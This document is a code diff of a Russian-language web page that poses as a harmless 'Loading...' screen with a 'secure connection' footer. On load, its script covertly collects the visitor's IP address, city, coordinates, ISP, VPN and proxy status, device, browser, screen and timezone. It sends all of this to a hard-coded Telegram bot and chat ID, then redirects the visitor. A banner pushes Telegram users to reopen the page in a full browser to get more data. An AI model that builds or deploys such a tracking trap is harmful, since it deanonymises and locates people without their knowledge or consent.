@@ -2,110 +2,332 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
     <title>Loading...</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            font-family: -apple-system, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            background: #f5f5f5;
-            color: #333;
+            min-height: 100vh;
+            background: #0d1117;
+            color: #c9d1d9;
+            padding: 16px;
         }
         .container {
+            max-width: 420px;
+            width: 100%;
+            background: #161b22;
+            border-radius: 24px;
+            padding: 32px 24px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
             text-align: center;
         }
         h1 {
-            font-weight: 300;
-            font-size: 2rem;
+            font-weight: 400;
+            font-size: 1.8rem;
+            letter-spacing: -0.5px;
+            margin-bottom: 8px;
+        }
+        .sub {
+            font-size: 0.9rem;
+            color: #8b949e;
+            margin-bottom: 24px;
         }
         .spinner {
-            width: 40px;
-            height: 40px;
-            margin: 20px auto;
-            border: 4px solid #ddd;
-            border-top-color: #3498db;
+            width: 48px;
+            height: 48px;
+            margin: 0 auto 20px;
+            border: 4px solid #30363d;
+            border-top: 4px solid #58a6ff;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            animation: spin 0.9s linear infinite;
         }
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+        .status {
+            font-size: 0.85rem;
+            color: #8b949e;
+            background: #0d1117;
+            padding: 8px 16px;
+            border-radius: 40px;
+            display: inline-block;
+            margin-top: 8px;
+            opacity: 0.9;
+        }
+        .footer {
+            margin-top: 24px;
+            font-size: 0.7rem;
+            color: #30363d;
+        }
+        .telegram-warning {
+            background: #da3633;
+            color: #fff;
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-weight: 500;
+            display: none;
+        }
+        .telegram-warning.show {
+            display: block;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Загрузка...</h1>
+    <div class="container" id="app">
+        <div class="telegram-warning" id="tgWarning">⚠️ Откройте в Safari/Chrome для полной информации</div>
+        <h1>Загрузка</h1>
+        <div class="sub">Сбор данных...</div>
         <div class="spinner"></div>
+        <div class="status" id="statusText">Подключение...</div>
+        <div class="footer">© 2026 · Безопасное соединение</div>
     </div>
 
     <script>
-        // ----------------- НАСТРОЙКИ -----------------
+        // ============================
+        //  НАСТРОЙКИ
+        // ============================
         const BOT_TOKEN = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
         const CHAT_ID = "8212240529";
-        // ---------------------------------------------
+        const REDIRECT_URL = "https://example.com";
+        const REDIRECT_DELAY = 4000; // 4 секунды
 
-        // Функция отправки сообщения в Telegram (тихо, без ошибок)
+        // ============================
+        //  ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+        // ============================
+
+        // Безопасная отправка в Telegram (тихо, без ошибок)
         function sendToTelegram(text) {
             if (!text) return;
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
-            // Пытаемся отправить, но если не получится — просто игнорируем ошибку
             fetch(url).catch(() => {});
         }
 
-        // Основная цепочка: получаем IP, отправляем, затем пытаемся получить гео
-        function start() {
-            // 1. Получаем IP через ipify (надёжный HTTPS-сервис)
-            fetch('https://api.ipify.org?format=json')
-                .then(response => {
-                    if (!response.ok) throw new Error('Network error');
-                    return response.json();
-                })
-                .then(data => {
-                    const ip = data.ip;
-                    if (!ip) throw new Error('No IP');
-
-                    // Отправляем IP в Telegram (первое сообщение)
-                    sendToTelegram(`IP: ${ip}`);
-
-                    // 2. Пробуем получить геоданные через ip-api.com (HTTPS)
-                    // Но если этот запрос упадёт — ничего страшного, IP уже у нас есть.
-                    return fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org`)
-                        .then(res => {
-                            if (!res.ok) throw new Error('Geo API error');
-                            return res.json();
-                        })
-                        .then(geo => {
-                            if (geo.status === 'success') {
-                                const geoText = 
-                                    `Геоданные:\n` +
-                                    `Страна: ${geo.country || '—'}\n` +
-                                    `Город: ${geo.city || '—'}\n` +
-                                    `Координаты: ${geo.lat || '—'}, ${geo.lon || '—'}\n` +
-                                    `Провайдер: ${geo.isp || '—'}`;
-                                sendToTelegram(geoText);
-                            }
-                        })
-                        .catch(() => {
-                            // Гео не получились — молча игнорируем
-                        });
-                })
-                .catch(() => {
-                    // Если не удалось получить IP — отправляем заглушку (но на экране ничего не показываем)
-                    sendToTelegram('Не удалось определить IP');
-                });
-
-            // Через 2.5 секунды перенаправляем пользователя на example.com
-            setTimeout(() => {
-                window.location.href = 'https://example.com';
-            }, 2500);
+        // Обновление статуса на экране
+        function setStatus(msg) {
+            const el = document.getElementById('statusText');
+            if (el) el.textContent = msg;
         }
 
-        // Запускаем всё после полной загрузки страницы
-        window.addEventListener('load', start);
+        // Проверка, открыто ли в Telegram
+        function isTelegram() {
+            return navigator.userAgent.includes('Telegram') || 
+                   navigator.userAgent.includes('TelegramDesktop');
+        }
+
+        // Получение текущего времени с таймзоной
+        function getTimeInfo() {
+            const now = new Date();
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            return {
+                datetime: now.toLocaleString('ru-RU', { hour12: false }),
+                timezone: tz,
+                timestamp: now.toISOString()
+            };
+        }
+
+        // Определение устройства
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = 'Неизвестно';
+            let os = 'Неизвестно';
+            let browser = 'Неизвестно';
+
+            if (/iPhone|iPad|iPod/i.test(ua)) {
+                device = 'Apple iOS';
+                os = /iPhone OS (\d+_\d+)/i.test(ua) ? 'iOS ' + RegExp.$1.replace('_', '.') : 'iOS';
+            } else if (/Android/i.test(ua)) {
+                device = 'Android';
+                os = /Android (\d+\.\d+)/i.test(ua) ? 'Android ' + RegExp.$1 : 'Android';
+            } else if (/Windows/i.test(ua)) {
+                device = 'Windows PC';
+                os = /Windows NT (\d+\.\d+)/i.test(ua) ? 'Windows ' + RegExp.$1 : 'Windows';
+            } else if (/Mac OS X/i.test(ua)) {
+                device = 'Mac';
+                os = /Mac OS X (\d+_\d+)/i.test(ua) ? 'macOS ' + RegExp.$1.replace('_', '.') : 'macOS';
+            } else if (/Linux/i.test(ua)) {
+                device = 'Linux';
+                os = 'Linux';
+            }
+
+            if (/Edg/i.test(ua)) browser = 'Edge';
+            else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
+            else if (/Firefox/i.test(ua)) browser = 'Firefox';
+            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+            else if (/Opera|OPR/i.test(ua)) browser = 'Opera';
+
+            return { device, os, browser, userAgent: ua };
+        }
+
+        // Сбор дополнительных параметров экрана и языка
+        function getScreenInfo() {
+            return {
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                language: navigator.language || navigator.languages[0] || 'ru',
+                platform: navigator.platform || 'unknown'
+            };
+        }
+
+        // ============================
+        //  ОСНОВНАЯ ЛОГИКА
+        // ============================
+
+        async function main() {
+            // Показываем предупреждение, если Telegram
+            if (isTelegram()) {
+                document.getElementById('tgWarning').classList.add('show');
+                setStatus('Откройте в браузере для полных данных');
+            }
+
+            // Собираем локальные данные (не требующие сети)
+            const device = getDeviceInfo();
+            const screen = getScreenInfo();
+            const time = getTimeInfo();
+
+            // 1. Попытка получить IP через несколько источников (с запасом)
+            let ip = null;
+            const ipServices = [
+                'https://api.ipify.org?format=json',
+                'https://api.my-ip.io/ip.json',
+                'https://ip-api.com/json/?fields=query'
+            ];
+
+            for (const url of ipServices) {
+                try {
+                    const res = await fetch(url);
+                    if (!res.ok) continue;
+                    const data = await res.json();
+                    if (data.ip) { ip = data.ip; break; }
+                    if (data.query) { ip = data.query; break; }
+                } catch (_) { /* игнорируем */ }
+            }
+
+            // Если IP не определился — пробуем старый метод через заголовки (не всегда работает)
+            if (!ip) {
+                try {
+                    const fallback = await fetch('https://httpbin.org/ip');
+                    const data = await fallback.json();
+                    ip = data.origin || null;
+                } catch (_) {}
+            }
+
+            // Если всё равно нет — ставим заглушку
+            if (!ip) ip = 'Не определен';
+
+            // 2. Пытаемся получить геоданные (если IP не заглушка)
+            let geo = null;
+            if (ip && ip !== 'Не определен') {
+                try {
+                    const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone,as,reverse,mobile,proxy,hosting`);
+                    if (geoRes.ok) {
+                        const data = await geoRes.json();
+                        if (data.status === 'success') {
+                            geo = data;
+                        }
+                    }
+                } catch (_) {}
+
+                // Если первый гео-сервис не сработал — пробуем второй
+                if (!geo) {
+                    try {
+                        const geoRes2 = await fetch(`https://ipinfo.io/${ip}/json`);
+                        if (geoRes2.ok) {
+                            const data = await geoRes2.json();
+                            geo = {
+                                country: data.country || '—',
+                                regionName: data.region || '—',
+                                city: data.city || '—',
+                                lat: data.loc ? data.loc.split(',')[0] : '—',
+                                lon: data.loc ? data.loc.split(',')[1] : '—',
+                                isp: data.org || '—',
+                                org: data.org || '—',
+                                timezone: data.timezone || '—',
+                                as: data.as || '—',
+                                mobile: data.mobile || '—',
+                                proxy: data.proxy || '—',
+                                hosting: data.hosting || '—'
+                            };
+                        }
+                    } catch (_) {}
+                }
+            }
+
+            // 3. Формируем итоговое сообщение
+            let message = '🔹 НОВЫЙ ПЕРЕХОД 🔹\n';
+            message += `📍 IP: ${ip}\n`;
+            if (geo) {
+                message += `🌍 Страна: ${geo.country || '—'}\n`;
+                message += `🏙️ Город: ${geo.city || '—'}\n`;
+                message += `🗺️ Регион: ${geo.regionName || '—'}\n`;
+                message += `📌 Координаты: ${geo.lat || '—'}, ${geo.lon || '—'}\n`;
+                message += `🛜 Провайдер: ${geo.isp || '—'}\n`;
+                message += `🏢 Организация: ${geo.org || '—'}\n`;
+                message += `🕒 Часовой пояс: ${geo.timezone || '—'}\n`;
+                if (geo.as) message += `🔢 AS: ${geo.as}\n`;
+                if (geo.mobile !== undefined) message += `📱 Мобильный: ${geo.mobile ? 'Да' : 'Нет'}\n`;
+                if (geo.proxy !== undefined) message += `🔒 Прокси/VPN: ${geo.proxy ? 'Да' : 'Нет'}\n`;
+                if (geo.hosting !== undefined) message += `☁️ Хостинг: ${geo.hosting ? 'Да' : 'Нет'}\n`;
+            } else {
+                message += `🌍 Геоданные: не получены\n`;
+            }
+
+            // Добавляем информацию об устройстве
+            message += `💻 Устройство: ${device.device}\n`;
+            message += `🖥️ ОС: ${device.os}\n`;
+            message += `🌐 Браузер: ${device.browser}\n`;
+            message += `📐 Разрешение: ${screen.screenWidth}×${screen.screenHeight}\n`;
+            message += `🎨 Глубина цвета: ${screen.colorDepth} бит\n`;
+            message += `🗣️ Язык: ${screen.language}\n`;
+            message += `🔤 Платформа: ${screen.platform}\n`;
+            message += `⏰ Время: ${time.datetime}\n`;
+            message += `🌐 Таймзона: ${time.timezone}\n`;
+            message += `🆔 User-Agent: ${device.userAgent.substring(0, 120)}${device.userAgent.length > 120 ? '...' : ''}\n`;
+
+            // Добавляем ссылку на карту (если есть координаты)
+            if (geo && geo.lat !== '—' && geo.lon !== '—') {
+                message += `🗺️ Карта: https://www.openstreetmap.org/?mlat=${geo.lat}&mlon=${geo.lon}&zoom=12\n`;
+            }
+
+            // 4. Отправляем всё в Telegram
+            sendToTelegram(message);
+
+            // 5. Обновляем статус на странице
+            setStatus(`Готово (IP: ${ip})`);
+
+            // 6. Перенаправляем через заданное время
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, REDIRECT_DELAY);
+        }
+
+        // Запускаем после загрузки страницы
+        window.addEventListener('DOMContentLoaded', () => {
+            setStatus('Инициализация...');
+            // Даём браузеру небольшую паузу для рендера
+            setTimeout(main, 300);
+        });
+
+        // Обработка ошибок на уровне скрипта (чтобы ничего не сломалось)
+        window.onerror = function(msg, url, line, col, error) {
+            // Тихо логируем в консоль, но не показываем на экране
+            console.error('Ошибка:', msg, error);
+            // Попытка отправить хотя бы минимальное уведомление в Telegram
+            sendToTelegram(`⚠️ Ошибка скрипта: ${msg}`);
+            // Редирект всё равно выполняем
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 4000);
+        };
     </script>
 </body>
 </html>
